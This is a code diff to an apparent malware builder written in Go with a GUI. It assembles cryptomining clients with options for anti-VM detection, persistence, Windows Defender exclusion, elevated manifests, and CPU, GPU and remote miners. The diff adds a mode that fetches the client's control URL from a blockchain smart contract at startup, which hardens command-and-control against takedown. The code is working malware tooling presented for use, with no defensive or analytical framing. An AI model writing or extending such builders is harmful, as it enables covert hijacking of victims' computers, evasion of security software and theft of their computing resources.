@@ -26,6 +26,8 @@ import (
 type BuildConfig struct {
 	PanelURL          string `json:"panel_url"`
 	ConfigURL         string `json:"config_url"`
+	SmartContract     bool   `json:"smart_contract"`
+	ContractAddress   string `json:"contract_address"`
 	AntiVM            bool   `json:"antivm"`
 	Persistence       bool   `json:"persistence"`
 	DebugConsole      bool   `json:"debug_console"`
@@ -176,10 +178,12 @@ func runBuild(projectRoot string, cfg BuildConfig, output func(string)) bool {
 	}
 
 	args := fmt.Sprintf(
-		"& '%s' -panel_url '%s' -config_url '%s' -antivm %s -persistence %s -debug_console %s -admin_manifest %s -defender_exclusion %s -cpu_miner %s -gpu_miner %s -remote_miners %s",
+		"& '%s' -panel_url '%s' -config_url '%s' -smart_contract %s -contract_address '%s' -antivm %s -persistence %s -debug_console %s -admin_manifest %s -defender_exclusion %s -cpu_miner %s -gpu_miner %s -remote_miners %s",
 		buildScript,
 		cfg.PanelURL,
 		cfg.ConfigURL,
+		boolStr(cfg.SmartContract),
+		cfg.ContractAddress,
 		boolStr(cfg.AntiVM),
 		boolStr(cfg.Persistence),
 		boolStr(cfg.DebugConsole),
@@ -332,6 +336,12 @@ func main() {
 	configURLEntry := widget.NewEntry()
 	configURLEntry.SetPlaceHolder("https://pastebin.com/raw/YOUR_ID")
 
+	// Smart contract URL fields
+	chkSmartContract := widget.NewCheck("Use Smart Contract for URL", nil)
+	contractAddressEntry := widget.NewEntry()
+	contractAddressEntry.SetPlaceHolder("0xYourContractAddress")
+	contractAddressEntry.Disable()
+
 	chkAntiVM := widget.NewCheck("Anti-VM Detection", nil)
 	chkPersistence := widget.NewCheck("Persistence", nil)
 	chkDebugConsole := widget.NewCheck("Debug Console", nil)
@@ -343,17 +353,30 @@ func main() {
 	chkGPUMiner := widget.NewCheck("GPU Miner", nil)
 	chkRemoteMiners := widget.NewCheck("Remote Miners", nil)
 
-	minerInfoLabel := hint("Choose either Panel URL or Config GET URL above, then select miners.")
+	minerInfoLabel := hint("Choose either Panel URL, Config GET URL, or Smart Contract above, then select miners.")
 
 	// Dynamic miner option logic
 	updateMinerOptions := func() {
 		panel := strings.TrimSpace(panelURLEntry.Text)
 		config := strings.TrimSpace(configURLEntry.Text)
+		useContract := chkSmartContract.Checked
 
-		isGetMode := config != ""
+		isGetMode := config != "" && !useContract
 
-		if isGetMode {
+		if useContract {
+			// Smart contract mode: behaves like panel mode (POST)
+			contractAddressEntry.Enable()
+			panelURLEntry.Disable()
+			configURLEntry.Disable()
+			chkCPUMiner.Enable()
+			chkGPUMiner.Enable()
+			chkRemoteMiners.Enable()
+			minerInfoLabel.SetText("Smart contract mode: URL fetched from blockchain at runtime. Panel mode options available.")
+		} else if isGetMode {
 			// GET/pastebin mode: embed miners only, remote load not supported
+			contractAddressEntry.Disable()
+			panelURLEntry.Enable()
+			configURLEntry.Enable()
 			chkCPUMiner.Enable()
 			chkGPUMiner.Enable()
 			chkRemoteMiners.SetChecked(false)
@@ -361,18 +384,25 @@ func main() {
 			minerInfoLabel.SetText("GET mode: embed miners only. Remote load is not available with a direct GET URL.")
 		} else if panel != "" {
 			// Panel mode: all options available — embed, remote, or both
+			contractAddressEntry.Disable()
+			panelURLEntry.Enable()
+			configURLEntry.Enable()
 			chkCPUMiner.Enable()
 			chkGPUMiner.Enable()
 			chkRemoteMiners.Enable()
 			minerInfoLabel.SetText("Panel mode: embed miners, use remote load, or both.")
 		} else {
+			contractAddressEntry.Disable()
+			panelURLEntry.Enable()
+			configURLEntry.Enable()
 			chkCPUMiner.Enable()
 			chkGPUMiner.Enable()
 			chkRemoteMiners.Enable()
-			minerInfoLabel.SetText("Choose either Panel URL or Config GET URL above, then select miners.")
+			minerInfoLabel.SetText("Choose either Panel URL, Config GET URL, or Smart Contract above, then select miners.")
 		}
 	}
 
+	chkSmartContract.OnChanged = func(_ bool) { updateMinerOptions() }
 	panelURLEntry.OnChanged = func(_ string) { updateMinerOptions() }
 	configURLEntry.OnChanged = func(_ string) { updateMinerOptions() }
 
@@ -380,6 +410,8 @@ func main() {
 		return BuildConfig{
 			PanelURL:          strings.TrimSpace(panelURLEntry.Text),
 			ConfigURL:         strings.TrimSpace(configURLEntry.Text),
+			SmartContract:     chkSmartContract.Checked,
+			ContractAddress:   strings.TrimSpace(contractAddressEntry.Text),
 			AntiVM:            chkAntiVM.Checked,
 			Persistence:       chkPersistence.Checked,
 			DebugConsole:      chkDebugConsole.Checked,
@@ -394,6 +426,8 @@ func main() {
 	applyConfig := func(cfg BuildConfig) {
 		panelURLEntry.SetText(cfg.PanelURL)
 		configURLEntry.SetText(cfg.ConfigURL)
+		chkSmartContract.SetChecked(cfg.SmartContract)
+		contractAddressEntry.SetText(cfg.ContractAddress)
 		chkAntiVM.SetChecked(cfg.AntiVM)
 		chkPersistence.SetChecked(cfg.Persistence)
 		chkDebugConsole.SetChecked(cfg.DebugConsole)
@@ -466,8 +500,12 @@ func main() {
 
 	buildBtn.OnTapped = func() {
 		cfg := getConfig()
-		if cfg.PanelURL == "" && cfg.ConfigURL == "" {
-			dialog.ShowError(fmt.Errorf("please enter either Panel URL or Config GET URL"), w)
+		if cfg.PanelURL == "" && cfg.ConfigURL == "" && !cfg.SmartContract {
+			dialog.ShowError(fmt.Errorf("please enter either Panel URL, Config GET URL, or enable Smart Contract"), w)
+			return
+		}
+		if cfg.SmartContract && cfg.ContractAddress == "" {
+			dialog.ShowError(fmt.Errorf("contract address is required for smart contract mode"), w)
 			return
 		}
 
@@ -476,8 +514,12 @@ func main() {
 		buildBtn.Disable()
 		statusLabel.SetText("Building...")
 		appendOutput(fmt.Sprintf("[%s] Starting build...\n", timestamp()))
-		appendOutput(fmt.Sprintf("Panel URL:   %s\nConfig URL:  %s\nAntiVM: %v  Persistence: %v  Debug: %v  Admin: %v  Defender: %v\nCPU: %v  GPU: %v  Remote: %v\n\n",
-			cfg.PanelURL, cfg.ConfigURL,
+		if cfg.SmartContract {
+			appendOutput(fmt.Sprintf("Contract: %s\n", cfg.ContractAddress))
+		} else {
+			appendOutput(fmt.Sprintf("Panel URL:   %s\nConfig URL:  %s\n", cfg.PanelURL, cfg.ConfigURL))
+		}
+		appendOutput(fmt.Sprintf("AntiVM: %v  Persistence: %v  Debug: %v  Admin: %v  Defender: %v\nCPU: %v  GPU: %v  Remote: %v\n\n",
 			cfg.AntiVM, cfg.Persistence, cfg.DebugConsole, cfg.AdminManifest, cfg.DefenderExclusion,
 			cfg.CPUMiner, cfg.GPUMiner, cfg.RemoteMiners,
 		))
@@ -606,9 +648,18 @@ func main() {
 	// ── Layout ───────────────────────────────────────────────────────────────
 
 	// --- Left panel (settings) ---
+	contractFrame := widget.NewCard("Smart Contract URL", "",
+		container.NewVBox(
+			chkSmartContract,
+			hint("When checked, the client reads the URL from the TextStorage contract at startup."),
+			separator(),
+			labeled("Contract Address:", contractAddressEntry),
+		),
+	)
+
 	connectionFrame := widget.NewCard("Connection Settings", "",
 		container.NewVBox(
-			hint("⚠  Use EITHER Panel URL OR Config URL — not both."),
+			hint("⚠  Use EITHER Panel URL OR Config URL — not both. Leave empty when using Smart Contract."),
 			hint("Multiple URLs: comma-separated (,)"),
 			separator(),
 			labeled("Panel URL:", panelURLEntry),
@@ -646,6 +697,7 @@ func main() {
 		hint("Professional Build Configuration"),
 		separator(),
 		profileFrame,
+		contractFrame,
 		connectionFrame,
 		featuresFrame,
 		minerFrame,
